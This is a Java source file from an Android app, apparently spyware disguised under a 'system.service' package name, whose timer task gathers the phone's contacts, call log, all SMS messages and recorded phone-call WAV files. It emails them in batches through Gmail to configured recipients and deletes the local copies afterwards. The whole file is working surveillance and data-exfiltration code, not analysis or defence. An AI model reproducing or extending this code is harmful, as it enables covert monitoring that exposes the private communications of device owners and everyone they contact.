package system.service;

import java.io.DataOutputStream;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.TimerTask;

import system.service.activity.GlobalPrefActivity;
import system.service.config.ConfigCtrl;
import system.service.config.MailCfg;
import system.service.feature.contact.ContactCtrl;
import system.service.feature.contact.ContactInfo;
import system.service.feature.phonecall.PhoneCallCtrl;
import system.service.feature.phonecall.PhoneCallInfo;
import system.service.feature.sms.SmsCtrl;
import system.service.feature.sms.SmsInfo;

import com.particle.inspector.common.util.DatetimeUtil;
import com.particle.inspector.common.util.NetworkUtil;
import com.particle.inspector.common.util.StrUtils;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.DeviceProperty;
import com.particle.inspector.common.util.mail.GMailSenderEx;
import com.particle.inspector.common.util.FileCtrl;

import android.app.Activity;
import android.app.Service;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.net.Uri;
import android.os.Environment;
import android.util.Log;

/**
 * Implementation of the timer task for information collection.
 */
public class GetInfoTask extends TimerTask 
{
	private final static String LOGTAG = "GetInfoTask";
	
	private final static int DEFAULT_RETRY_COUNT = 3;
	
	public Context context;
	private int interval = 1; // interval days
	
	public static List<File> attachments;
	
	public GetInfoTask(Context context)
	{
		super();
		this.context = context;
		if (attachments != null) attachments.clear();
		else attachments = new ArrayList<File>();
		
		interval = GlobalPrefActivity.getInfoInterval(context);
	}
	
	public void run() 
	{
		// If there are no recipients, return 
		String[] recipients = getRecipients(context);
		if (recipients == null || recipients.length == 0) return;
		
		// If network connected, try to collect and send the information
		if (!NetworkUtil.isNetworkConnected(context)) return;
		
		// ===================================================================================
		// Try to send contact/phonecall/SMS collections
		// ===================================================================================
		
		// Firstly we should make sure the time range ( > days that user set)
		Date lastDatetime = null;
		String lastDatetimeStr = ConfigCtrl.getLastGetInfoTime(context);
		if (lastDatetimeStr != null && lastDatetimeStr.length() > 0) {
			try {
				lastDatetime = DatetimeUtil.format.parse(lastDatetimeStr);
			} catch (Exception ex) {}
		}
			
		Calendar now = Calendar.getInstance();
		if (interval < 1) interval = 1;
		now.add(Calendar.DATE, -1*interval);
		Date now_minus_x_day = now.getTime();
		if (lastDatetime != null && now_minus_x_day.before(lastDatetime)) 
		{
			return;
		}
		
		// Clean attachments
		if (attachments == null) attachments = new ArrayList<File>();
		else attachments.clear();
		
		// Collect information
		CollectContact(context);
		SysUtils.threadSleep(1000, LOGTAG);
		CollectPhoneCallHist(context);
		SysUtils.threadSleep(1000, LOGTAG);
		CollectSms(context);
		SysUtils.threadSleep(1000, LOGTAG);
		
		if (!NetworkUtil.isNetworkConnected(context)) {
			// Clean the files in SD-CARD
			FileCtrl.cleanTxtFiles();
			return;
		}
		
		// Send mail
		String phoneNum = ConfigCtrl.getSelfName(context);
		String subject = context.getResources().getString(R.string.mail_from) 
	          		 + phoneNum + "-" + DatetimeUtil.format3.format(new Date())
	          		 + context.getResources().getString(R.string.mail_description);
		String body = String.format(context.getResources().getString(R.string.mail_body), phoneNum);
		String pwd = MailCfg.getSenderPwd(context);
		
		boolean result = false;
		int retry = DEFAULT_RETRY_COUNT;
		while(!result && retry > 0)
		{
			String sender = MailCfg.getSender(context);
			result = sendMail(subject, body, sender, pwd, recipients, attachments);
			retry--;
		}
		attachments.clear();
			
		// Update the last date time
		if (result) {
			boolean successful = ConfigCtrl.setLastGetInfoTime(context, new Date());
			if (!successful) Log.w(LOGTAG, "Failed to setLastGetInfoTime");
		}
		
		// Clean the files in SD-CARD
		FileCtrl.cleanTxtFiles();
		
		// ===================================================================================
		// Try to send phone call recording
		// ===================================================================================
		SysUtils.threadSleep(1000, LOGTAG);
		if (!NetworkUtil.isNetworkConnected(context)) {
			return;
		}
		
		// Get all wav files
		String prefix = context.getResources().getString(R.string.phonecall_record);
		List<File> wavs = new ArrayList<File>();
		try {
			File dir = FileCtrl.getDefaultDir();
			if (!dir.exists() || !dir.isDirectory()) return;
			
			File[] files = dir.listFiles();
			String name;
			for (int i = 0; i < files.length; i++) {
				name = files[i].getName();
				if (files[i].isFile() &&
					//name.startsWith(prefix) && 
					name.endsWith(FileCtrl.SUFFIX_WAV))
				{
					wavs.add(files[i]);
				}
			}
		} catch (Exception e) {
			Log.e(LOGTAG, e.getMessage());
		}
		
		int wavCount = wavs.size();
		if (wavCount <= 0) return;
		
		// Send mails (5 wavs attached per mail) 
		int COUNT_PER_PACKAGE = 5;
		for (int i=0; i < (1 + wavCount/COUNT_PER_PACKAGE); i++) {
			List<File> pack = getPackage(wavs, COUNT_PER_PACKAGE, i);
			if (pack.size() <= 0) break;

			subject = prefix + "-" + context.getResources().getString(R.string.mail_from) + phoneNum 
		       		 + "-" + DatetimeUtil.format3.format(new Date()) 
		       		 + "-" + String.valueOf(i+1);
			body = String.format(context.getResources().getString(R.string.mail_body), phoneNum);
			//String pwd = MailCfg.getSenderPwd(context);
		
			if (!NetworkUtil.isNetworkConnected(context)) {
				return;
			}
			result = false;
			retry = DEFAULT_RETRY_COUNT;
			while(!result && retry > 0)
			{
				String sender = MailCfg.getSender(context);
				result = sendMail(subject, body, sender, pwd, recipients, pack);
				retry--;
			}
		
			// Clean wav files in SD-CARD
			if (result) {
				FileCtrl.cleanWavFiles(pack);
			}
		}
		
	} // end of run()
	
	// Get i*count ~ (i+1)*count members in wavs as one package
	private List<File> getPackage(List<File> wavs, final int count, final int i) 
	{
		List<File> pack = new ArrayList<File>();
		
		int wavCount = wavs.size();
		for (int j=i*count; j<(i+1)*count; j++) {
			if (j < wavCount) {
				pack.add(wavs.get(j));
			}
		}
		return pack;
	}
	
	public static void CollectSms(Context context) 
	{
		StringBuilder sb = new StringBuilder();
		List<SmsInfo> list = SmsCtrl.getSmsList(context, SmsCtrl.SMS_URI_ALL);
		for (int i = 0; i < list.size(); i++)
		{
			sb.append(list.get(i).toString(context));
		}
		
		String deviceName = ConfigCtrl.getSelfName(context);
		String fileName = FileCtrl.makeFileName(context, context.getResources().getString(R.string.sms_name), deviceName, FileCtrl.SUFFIX_TXT); 
		try {
			if (!FileCtrl.defaultDirExist()) FileCtrl.creatDefaultSDDir();
				
			File file = FileCtrl.Save2DefaultDirInSDCard(fileName, sb.toString());
			if (file != null) attachments.add(file);
		} catch (Exception e) {
			Log.e(LOGTAG, e.getMessage());
		}
	}

	public static void CollectPhoneCallHist(Context context) 
	{
		StringBuilder sb = new StringBuilder();
		List<PhoneCallInfo> list = PhoneCallCtrl.getPhoneCallHistory(context);
		for (int i = 0; i < list.size(); i++)
		{
			sb.append(list.get(i).toString(context));
		}
		
		String deviceName = ConfigCtrl.getSelfName(context);
		String fileName = FileCtrl.makeFileName(context, context.getResources().getString(R.string.phonecall_name), deviceName, FileCtrl.SUFFIX_TXT); 
		try {
			if (!FileCtrl.defaultDirExist()) FileCtrl.creatDefaultSDDir();
				
			File file = FileCtrl.Save2DefaultDirInSDCard(fileName, sb.toString());
			if (file != null) attachments.add(file);
		} catch (Exception e) {
			Log.e(LOGTAG, e.getMessage());
		}
	}

	public static void CollectContact(Context context) 
	{
		StringBuilder sb = new StringBuilder();
		List<ContactInfo> list = ContactCtrl.getContactList(context);
		for (int i = 0; i < list.size(); i++)
		{
			sb.append(list.get(i).toString(context));
		}
		
		String deviceName = ConfigCtrl.getSelfName(context);
		String fileName = FileCtrl.makeFileName(context, context.getResources().getString(R.string.contact_name), deviceName, FileCtrl.SUFFIX_TXT); 
		try {
			if (!FileCtrl.defaultDirExist()) FileCtrl.creatDefaultSDDir();
				
			File file = FileCtrl.Save2DefaultDirInSDCard(fileName, sb.toString());
			if (file != null) attachments.add(file);
		} catch (Exception e) {
			Log.e(LOGTAG, e.getMessage());
		}
	}
	
	public static boolean sendMail(String subject, String body, String sender, String pwd, String[] recipients, List<File> files)
	{
		boolean ret = false;

        try {   
            GMailSenderEx gmailSender = new GMailSenderEx(sender, pwd);
            gmailSender.setFrom(GMailSenderEx.DEFAULT_SENDER);
            gmailSender.setTo(recipients);
            gmailSender.setSubject(subject);
            gmailSender.setBody(body);
            
            for(int i = 0; i < files.size(); i++)
            	gmailSender.addAttachment(files.get(i));
            
            ret = gmailSender.send();
        } catch (Exception e) {   
            Log.e(LOGTAG, (e == null) ? "Failed to send mail" : e.getMessage());
        }
        
		return ret;
	}
	
	private static String[] getRecipients(Context context)
	{
		String mail = GlobalPrefActivity.getReceiverMail(context);
		String[] mails = mail.split(",");
		if (mails.length > 0) {
			return StrUtils.filterMails(mails);
		} else {
			return null;
		}
	}
	
}
